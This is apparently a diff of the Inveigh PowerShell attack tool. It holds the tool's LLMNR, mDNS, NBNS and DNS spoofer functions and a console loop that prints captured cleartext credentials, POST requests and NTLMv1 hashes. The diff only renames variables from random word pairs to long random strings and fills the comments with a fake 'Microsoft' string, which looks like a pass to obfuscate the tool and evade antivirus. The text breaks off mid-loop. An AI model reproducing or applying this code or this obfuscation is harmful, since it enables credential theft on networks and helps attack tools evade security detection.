-    $PlantsArch.AddScript($PressScream).AddArgument($MeekSmoggy).AddArgument(
-        $HandsHop).AddArgument($StickLame) > $null
-    $PlantsArch.BeginInvoke() > $null
+    $OTdVxwQVQhAflJJspROJoFCdBwcNUbCLInHWVVjGsjwL = [RunspaceFactory]::CreateRunspace()
+    $OTdVxwQVQhAflJJspROJoFCdBwcNUbCLInHWVVjGsjwL.Open()
+    $OTdVxwQVQhAflJJspROJoFCdBwcNUbCLInHWVVjGsjwL.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $xfhVsqxOZmOJDqamMHiEHwyYilYKmjTcJpfQcGTy = [PowerShell]::Create()
+    $xfhVsqxOZmOJDqamMHiEHwyYilYKmjTcJpfQcGTy.Runspace = $OTdVxwQVQhAflJJspROJoFCdBwcNUbCLInHWVVjGsjwL
+    $xfhVsqxOZmOJDqamMHiEHwyYilYKmjTcJpfQcGTy.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $xfhVsqxOZmOJDqamMHiEHwyYilYKmjTcJpfQcGTy.AddScript($EjVQkImoQAYoNxZEBqgvqnPIRUIKUARer).AddArgument($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn).AddArgument(
+        $uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl).AddArgument($zkTvnUBoWamaHbrMDvklWqGBdwC) > $null
+    $xfhVsqxOZmOJDqamMHiEHwyYilYKmjTcJpfQcGTy.BeginInvoke() > $null
 }
 
 # Microsoft".
 function LLMNRSpoofer
 {
-    $GazeVoice = [RunspaceFactory]::CreateRunspace()
-    $GazeVoice.Open()
-    $GazeVoice.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $MissSnow = [PowerShell]::Create()
-    $MissSnow.Runspace = $GazeVoice
-    $MissSnow.AddScript($LivelySqueak) > $null
-    $MissSnow.AddScript($UsedMice).AddArgument($MeekSmoggy).AddArgument(
-        $TeaseNasty).AddArgument($StickLame).AddArgument($BikeLoud).AddArgument(
-        $HoleRoute).AddArgument($WoozyClose).AddArgument(
-        $ObeyAttack).AddArgument($JokeFaulty) > $null
-    $MissSnow.BeginInvoke() > $null
+    $JOeSHbuvdkpTEXoaknjMShsaKwEG = [RunspaceFactory]::CreateRunspace()
+    $JOeSHbuvdkpTEXoaknjMShsaKwEG.Open()
+    $JOeSHbuvdkpTEXoaknjMShsaKwEG.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $dFURQYLJXMMkwuxNLbIoojTakuZxLAtzYDKTX = [PowerShell]::Create()
+    $dFURQYLJXMMkwuxNLbIoojTakuZxLAtzYDKTX.Runspace = $JOeSHbuvdkpTEXoaknjMShsaKwEG
+    $dFURQYLJXMMkwuxNLbIoojTakuZxLAtzYDKTX.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $dFURQYLJXMMkwuxNLbIoojTakuZxLAtzYDKTX.AddScript($SNRderqeHFbwJuNrKPKkOevSiCtMqJojXzWyfC).AddArgument($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn).AddArgument(
+        $UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD).AddArgument($zkTvnUBoWamaHbrMDvklWqGBdwC).AddArgument($EPlJedBuToZfupQVQRyNJcsGRdsiyc).AddArgument(
+        $fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo).AddArgument($swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe).AddArgument(
+        $GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg).AddArgument($iNyWtiQGdKJEvnLZUaOj) > $null
+    $dFURQYLJXMMkwuxNLbIoojTakuZxLAtzYDKTX.BeginInvoke() > $null
 }
 
 # Microsoft".
 function mDNSSpoofer
 {
-    $SpySteer = [RunspaceFactory]::CreateRunspace()
-    $SpySteer.Open()
-    $SpySteer.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $JazzySedate = [PowerShell]::Create()
-    $JazzySedate.Runspace = $SpySteer
-    $JazzySedate.AddScript($LivelySqueak) > $null
-    $JazzySedate.AddScript($SleetGrip).AddArgument($MeekSmoggy).AddArgument(
-        $MurderOffer).AddArgument($WantLittle).AddArgument($StickLame).AddArgument($BikeLoud).AddArgument(
-        $HoleRoute).AddArgument($WoozyClose).AddArgument($ObeyAttack) > $null
-    $JazzySedate.BeginInvoke() > $null
+    $JHDyEZJxkRhTifAnLDmeWOjjlhqRjGwsq = [RunspaceFactory]::CreateRunspace()
+    $JHDyEZJxkRhTifAnLDmeWOjjlhqRjGwsq.Open()
+    $JHDyEZJxkRhTifAnLDmeWOjjlhqRjGwsq.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $afzJLdpiAULPuOTySIPyiFgKstKLCJvSthTYRQlOi = [PowerShell]::Create()
+    $afzJLdpiAULPuOTySIPyiFgKstKLCJvSthTYRQlOi.Runspace = $JHDyEZJxkRhTifAnLDmeWOjjlhqRjGwsq
+    $afzJLdpiAULPuOTySIPyiFgKstKLCJvSthTYRQlOi.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $afzJLdpiAULPuOTySIPyiFgKstKLCJvSthTYRQlOi.AddScript($dINAWiUdSfggURFMdlbCginhqfYAxPEeFPa).AddArgument($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn).AddArgument(
+        $LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk).AddArgument($oiEknJevzfgMBjSqYIpc).AddArgument($zkTvnUBoWamaHbrMDvklWqGBdwC).AddArgument($EPlJedBuToZfupQVQRyNJcsGRdsiyc).AddArgument(
+        $fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo).AddArgument($swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe).AddArgument($GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg) > $null
+    $afzJLdpiAULPuOTySIPyiFgKstKLCJvSthTYRQlOi.BeginInvoke() > $null
 }
 
 # Microsoft".
 function NBNSSpoofer
 {
-    $BloodyGirl = [RunspaceFactory]::CreateRunspace()
-    $BloodyGirl.Open()
-    $BloodyGirl.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $EyesNorth = [PowerShell]::Create()
-    $EyesNorth.Runspace = $BloodyGirl
-    $EyesNorth.AddScript($LivelySqueak) > $null
-    $EyesNorth.AddScript($YokeInjure).AddArgument($MeekSmoggy).AddArgument(
-        $SmashDolls).AddArgument($BlushCattle).AddArgument($ThawMiddle).AddArgument($StickLame).AddArgument(
-        $HoleRoute).AddArgument($BikeLoud).AddArgument($ObeyAttack).AddArgument(
-        $WoozyClose).AddArgument($JokeFaulty) > $null
-    $EyesNorth.BeginInvoke() > $null
+    $cRGJUJLKuwhoSpwlkJYJEstqCgtSxCocFe = [RunspaceFactory]::CreateRunspace()
+    $cRGJUJLKuwhoSpwlkJYJEstqCgtSxCocFe.Open()
+    $cRGJUJLKuwhoSpwlkJYJEstqCgtSxCocFe.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $WStDbmxEoETwguWnbJMIt = [PowerShell]::Create()
+    $WStDbmxEoETwguWnbJMIt.Runspace = $cRGJUJLKuwhoSpwlkJYJEstqCgtSxCocFe
+    $WStDbmxEoETwguWnbJMIt.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $WStDbmxEoETwguWnbJMIt.AddScript($HKLlyGSEjLdPNnglCuAMTnVKGAJWthQ).AddArgument($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn).AddArgument(
+        $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS).AddArgument($fgjekbNhYQKGsQdqOkUhuYvojUQK).AddArgument($XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ).AddArgument($zkTvnUBoWamaHbrMDvklWqGBdwC).AddArgument(
+        $fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo).AddArgument($EPlJedBuToZfupQVQRyNJcsGRdsiyc).AddArgument($GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg).AddArgument(
+        $swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe).AddArgument($iNyWtiQGdKJEvnLZUaOj) > $null
+    $WStDbmxEoETwguWnbJMIt.BeginInvoke() > $null
 }
 
 # Microsoft".
 function NBNSBruteForceSpoofer
 {
-    $RefuseCanvas = [RunspaceFactory]::CreateRunspace()
-    $RefuseCanvas.Open()
-    $RefuseCanvas.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $TeenyBasin = [PowerShell]::Create()
-    $TeenyBasin.Runspace = $RefuseCanvas
-    $TeenyBasin.AddScript($LivelySqueak) > $null
-    $TeenyBasin.AddScript($KickWord).AddArgument(
-    $DelayValue).AddArgument($MournMean).AddArgument($NorthLumpy).AddArgument(
-    $BlushCattle).AddArgument($StickLame) > $null
-    $TeenyBasin.BeginInvoke() > $null
+    $pshQcgZCmyKLbHoCvOdisZOjyeZEuGLIuhX = [RunspaceFactory]::CreateRunspace()
+    $pshQcgZCmyKLbHoCvOdisZOjyeZEuGLIuhX.Open()
+    $pshQcgZCmyKLbHoCvOdisZOjyeZEuGLIuhX.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $YRGIudSpCBrfuzGmsgywJOEt = [PowerShell]::Create()
+    $YRGIudSpCBrfuzGmsgywJOEt.Runspace = $pshQcgZCmyKLbHoCvOdisZOjyeZEuGLIuhX
+    $YRGIudSpCBrfuzGmsgywJOEt.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $YRGIudSpCBrfuzGmsgywJOEt.AddScript($ZrWvpgCNDBwDMqOVLwwyN).AddArgument(
+    $WfbavDNzjNgDFDUYWZEYjga).AddArgument($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu).AddArgument($deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP).AddArgument(
+    $fgjekbNhYQKGsQdqOkUhuYvojUQK).AddArgument($zkTvnUBoWamaHbrMDvklWqGBdwC) > $null
+    $YRGIudSpCBrfuzGmsgywJOEt.BeginInvoke() > $null
 }
 
 # Microsoft".
 function ControlLoop
 {
-    $CastHope = [RunspaceFactory]::CreateRunspace()
-    $CastHope.Open()
-    $CastHope.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $ShirtFlower = [PowerShell]::Create()
-    $ShirtFlower.Runspace = $CastHope
-    $ShirtFlower.AddScript($LivelySqueak) > $null
-    $ShirtFlower.AddScript($StreetFound) > $null
-    $ShirtFlower.AddScript($ErectJog).AddArgument($HeatIll).AddArgument(
-        $CuteGroup).AddArgument($BlackFilthy).AddArgument($TrapJoin).AddArgument(
-        $KnownFood).AddArgument($StoryFurry).AddArgument($LiveSedate).AddArgument(
-        $BouncyEven).AddArgument($ShinyAunt).AddArgument($ViewNice).AddArgument(
-        $IceFix).AddArgument($FarDry).AddArgument($FullGrin).AddArgument(
-        $FailDad).AddArgument($DressGround).AddArgument($MournMean).AddArgument(
-        $MatterOffice).AddArgument($GrowthWind).AddArgument($StickLame) > $null
-    $ShirtFlower.BeginInvoke() > $null
+    $qIzvTkHUgbpmJGiMCNQRgoNdYsLzmnwI = [RunspaceFactory]::CreateRunspace()
+    $qIzvTkHUgbpmJGiMCNQRgoNdYsLzmnwI.Open()
+    $qIzvTkHUgbpmJGiMCNQRgoNdYsLzmnwI.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $pOUPlMNikuJXQNrWKeudcOdBeQHzmzPjPf = [PowerShell]::Create()
+    $pOUPlMNikuJXQNrWKeudcOdBeQHzmzPjPf.Runspace = $qIzvTkHUgbpmJGiMCNQRgoNdYsLzmnwI
+    $pOUPlMNikuJXQNrWKeudcOdBeQHzmzPjPf.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $pOUPlMNikuJXQNrWKeudcOdBeQHzmzPjPf.AddScript($hbLMHnQegNxGhBNPKzkwhonMNWEuycgdyJLrBxt) > $null
+    $pOUPlMNikuJXQNrWKeudcOdBeQHzmzPjPf.AddScript($oWMmjCcPJnxEalgUQekFIztXhyumRXkIlyLSfwZotoOLu).AddArgument($hfdTDJMIWbkWdkyrTVXeElGpVPakhrijbMLWgef).AddArgument(
+        $NcOuDYrPMCFkGAkGVeXkawbkHNSRTshpDrpJvCbYEvB).AddArgument($ssnImzbkFylCcfywIEEVBwc).AddArgument($NuKysEWfwHfjXVFRVZPgsYOxkAnIFj).AddArgument(
+        $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO).AddArgument($uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz).AddArgument($UOzMMsyJArPmhisyLVaGMsjMfqvxxPEEqcCGGGiDZcZ).AddArgument(
+        $mUfKHWVntBnTLNKQYEtLBIaCAkwKF).AddArgument($IhJmgwPnhtuPfSfJnHIiUD).AddArgument($BFlwqVfFgHmnWSTrqOBa).AddArgument(
+        $HrZcGMZkGIqzkfsIOcryPlOaGnDRdnbAQIgw).AddArgument($EishpmLeabgtsVFwpBjSiSwYdQOFqXys).AddArgument($IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE).AddArgument(
+        $futRGbdymzbIAOSHtlviC).AddArgument($AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR).AddArgument($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu).AddArgument(
+        $KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX).AddArgument($PHCBkumExoZsaamTxeZRDLT).AddArgument($zkTvnUBoWamaHbrMDvklWqGBdwC) > $null
+    $pOUPlMNikuJXQNrWKeudcOdBeQHzmzPjPf.BeginInvoke() > $null
 }
 
 # Microsoft".
 # Microsoft".
 
 # Microsoft".
-if($ChargeClap -eq 'Y')
+if($XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo -eq 'Y')
 {
     HTTPListener
 }
 
 # Microsoft".
-if($SourBottle -eq 'Y')
+if($zXuJKxMkcdZHqkkVbrPql -eq 'Y')
 {
     HTTPSListener
 }
 
 # Microsoft".
-if($JumpyWrench -eq 'Y')
+if($QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB -eq 'Y')
 {
     ProxyListener
 }
 
 # Microsoft".
-if(($HomelyShow -eq 'Y' -or $LipMeat -eq 'Y' -or $BoilClever -eq 'Y' -or $PeckFirst -eq 'Y' -or $NorthAmuck -eq 'Y' -or $MeekSmoggy) -and $DressGround)
+if(($tPEylzZKZOmcrNuZqaNvxfEfrUAkL -eq 'Y' -or $PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $QdOGoORVrhoEArPgHPqrqy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y' -or $UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB -eq 'Y' -or $ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn) -and $AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
 { 
     SnifferSpoofer
 }
-elseif(($HomelyShow -eq 'Y' -or $LipMeat -eq 'Y' -or $BoilClever -eq 'Y' -or $PeckFirst -eq 'Y' -or $NorthAmuck -eq 'Y') -and !$DressGround)
+elseif(($tPEylzZKZOmcrNuZqaNvxfEfrUAkL -eq 'Y' -or $PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $QdOGoORVrhoEArPgHPqrqy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y' -or $UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB -eq 'Y') -and !$AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
 {
 
-    if($HomelyShow -eq 'Y')
+    if($tPEylzZKZOmcrNuZqaNvxfEfrUAkL -eq 'Y')
     {
         DNSSpoofer
     }
 
-    if($LipMeat -eq 'Y')
+    if($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y')
     {
         LLMNRSpoofer
     }
 
-    if($BoilClever -eq 'Y')
+    if($QdOGoORVrhoEArPgHPqrqy -eq 'Y')
     {
         mDNSSpoofer
     }
 
-    if($PeckFirst -eq 'Y')
+    if($FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y')
     {
         NBNSSpoofer
     }
 
-    if($SeaEarth -eq 'Y')
+    if($POSxdOOZVTyYRayFSuOkyqkjOdwHvYEdfwrlikHIsVD -eq 'Y')
     {
         NBNSBruteForceSpoofer
     }
@@ -5750,7 +5750,7 @@ elseif(($HomelyShow -eq 'Y' -or $LipMeat -eq 'Y' -or $BoilClever -eq 'Y' -
 }
 
 # Microsoft".
-if($SeaEarth -eq 'Y')
+if($POSxdOOZVTyYRayFSuOkyqkjOdwHvYEdfwrlikHIsVD -eq 'Y')
 {
     NBNSBruteForceSpoofer
 }
@@ -5762,223 +5762,223 @@ ControlLoop
 try
 {
 
-    if($RottenBed -ne 'N')
+    if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -ne 'N')
     {
 
-        if($CycleLovely)
+        if($WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn)
         {    
-            $RelyHollow = New-TimeSpan -Minutes $CycleLovely
-            $EggsBike = [System.Diagnostics.Stopwatch]::StartNew()
+            $iGmePOLaXRpfXDATmFrpMvDbF = New-TimeSpan -Minutes $WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn
+            $VPFWKWaCfwaFChVPMofeFmLAUhloJRWMsr = [System.Diagnostics.Stopwatch]::StartNew()
         }
 
-        :console_loop while(($LightOval.running -and $LightOval.console_output) -or ($LightOval.console_queue.Count -gt 0 -and $LightOval.console_output))
+        :console_loop while(($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output) -or ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Count -gt 0 -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output))
         {
     
-            while($LightOval.console_queue.Count -gt 0)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Count -gt 0)
             {
 
-                switch -wildcard ($LightOval.console_queue[0])
+                switch -wildcard ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0])
                 {
 
                     {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                     {
 
-                        if($LightOval.output_stream_only)
+                        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only)
                         {
-                            Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0] + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                         }
                         else
                         {
-                            Write-Warning($LightOval.console_queue[0])
+                            Write-Warning($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0])
                         }
 
-                        $LightOval.console_queue.RemoveAt(0)
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     }
 
                     {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                     {
 
-                        if($RottenBed -eq 'Y')
+                        if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -eq 'Y')
                         {
 
-                            if($LightOval.output_stream_only)
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only)
                             {
-                                Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
+                                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0] + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                             }
                             else
                             {
-                                Write-TableSteam($LightOval.console_queue[0])
+                                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0])
                             }
 
                         }
 
-                        $LightOval.console_queue.RemoveAt(0)
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     } 
 
                     {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                     {
                     
-                        if($RottenBed -ne "Low")
+                        if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -ne "Low")
                         {
 
-                            if($LightOval.output_stream_only)
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only)
                             {
-                                Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
+                                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0] + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                             }
                             else
                             {
-                                Write-TableSteam($LightOval.console_queue[0])
+                                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0])
                             }
 
                         }
 
-                        $LightOval.console_queue.RemoveAt(0)
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     } 
 
                     default
                     {
 
-                        if($LightOval.output_stream_only)
+                        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only)
                         {
-                            Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0] + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                         }
                         else
                         {
-                            Write-TableSteam($LightOval.console_queue[0])
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0])
                         }
 
-                        $LightOval.console_queue.RemoveAt(0)
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     }
 
                 }
 
             }
 
-            if($CycleLovely -and $EggsBike.Elapsed -ge $RelyHollow)
+            if($WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn -and $VPFWKWaCfwaFChVPMofeFmLAUhloJRWMsr.Elapsed -ge $iGmePOLaXRpfXDATmFrpMvDbF)
             {
             
-                if($LightOval.cleartext_list.Count -gt 0)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list.Count -gt 0)
                 {
-                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $LightOval.newline)
-                    $LightOval.cleartext_list.Sort()
-                    $PestAwake = $LightOval.cleartext_list
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list.Sort()
+                    $DEhbbzntmotwuDAWceInZMONdgeBHLGAXUYsAklqVfAp = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list
 
-                    foreach($HeapMarked in $PestAwake)
+                    foreach($iLeXHShqmVLbXxTeBbGMgZOFFfegmOeWETbETRhJ in $DEhbbzntmotwuDAWceInZMONdgeBHLGAXUYsAklqVfAp)
                     {
 
-                        if($HeapMarked -ne $FaultyGlow)
+                        if($iLeXHShqmVLbXxTeBbGMgZOFFfegmOeWETbETRhJ -ne $QhhAirltvTrSQtAtUMBh)
                         {
-                            Write-TableSteam($HeapMarked + $LightOval.newline)
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($iLeXHShqmVLbXxTeBbGMgZOFFfegmOeWETbETRhJ + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                         }
 
-                        $FaultyGlow = $HeapMarked
+                        $QhhAirltvTrSQtAtUMBh = $iLeXHShqmVLbXxTeBbGMgZOFFfegmOeWETbETRhJ
                     }
 
                     Start-Sleep -m 5
                 }
                 else
                 {
-                    Write-TableSteam("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $LightOval.newline)
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                 }
 
-                if($LightOval.POST_request_list.Count -gt 0)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list.Count -gt 0)
                 {
-                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $LightOval.newline)
-                    $LightOval.POST_request_list.Sort()
-                    $EarBucketGround = $LightOval.POST_request_list
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list.Sort()
+                    $UmzbxXaDxiJnGOxWEWnRDFqQvCnHZaWBdlhQFheC = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list
 
-                    foreach($NoisyPour in $EarBucketGround)
+                    foreach($OecKZfKByeTVsbTemrTget in $UmzbxXaDxiJnGOxWEWnRDFqQvCnHZaWBdlhQFheC)
                     {
 
-                        if($NoisyPour -ne $PotatoHeat)
+                        if($OecKZfKByeTVsbTemrTget -ne $JwUZGadJGlxcEMqFqReMEXRB)
                         {
-                            Write-TableSteam($NoisyPour + $LightOval.newline)
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($OecKZfKByeTVsbTemrTget + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                         }
 
-                        $PotatoHeat = $NoisyPour
+                        $JwUZGadJGlxcEMqFqReMEXRB = $OecKZfKByeTVsbTemrTget
                     }
 
                     Start-Sleep -m 5
                 }
             
-                if($LightOval.NTLMv1_list.Count -gt 0)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list.Count -gt 0)
                 {
-                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $LightOval.newline)
-                    $LightOval.NTLMv1_list.Sort()
-                    $RayGlue = $LightOval.NTLMv1_list
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list.Sort()
+                    $TvEiFbIRXpDMpynGTiAMZtAAqlLdJzfKP = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list
 
-                    foreach($BattleHover in $RayGlue)
+                    foreach($KBNZEXuHLANtSyOWHcZUKjtynrbnZq in $TvEiFbIRXpDMpynGTiAMZtAAqlLdJzfKP)
                     {
-                        $PlaceDonkey = $BattleHover.SubString(0,$BattleHover.IndexOf(":",($BattleHover.IndexOf(":") + 2)))
+                        $IIzQgkUKVvGXCzPbONJGZGQWuGupKgU = $KBNZEXuHLANtSyOWHcZUKjtynrbnZq.SubString(0,$KBNZEXuHLANtSyOWHcZUKjtynrbnZq.IndexOf(":",($KBNZEXuHLANtSyOWHcZUKjtynrbnZq.IndexOf(":") + 2)))
 
-                        if($PlaceDonkey -ne $LooseStop)
+                        if($IIzQgkUKVvGXCzPbONJGZGQWuGupKgU -ne $tmJkdNbZulSifPCahBYASLPSoqGmM)
                         {
-                            Write-TableSteam($BattleHover + $LightOval.newline)
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($KBNZEXuHLANtSyOWHcZUKjtynrbnZq + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                         }
 
-                        $LooseStop = $PlaceDonkey
+                        $tmJkdNbZulSifPCahBYASLPSoqGmM = $IIzQgkUKVvGXCzPbONJGZGQWuGupKgU
                     }
 
-                    $LooseStop = ''
+                    $tmJkdNbZulSifPCahBYASLPSoqGmM = ''
                     Start-Sleep -m 5
-                    Write-TableSteam("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $LightOval.newline)
-                    $InsectBouncy = $LightOval.NTLMv1_username_list
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
+                    $XodGYFMYieIKSKzQFeSRHeqsASwRoUtaarAXT = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_username_list
 
-                    foreach($UnableLove in $InsectBouncy)
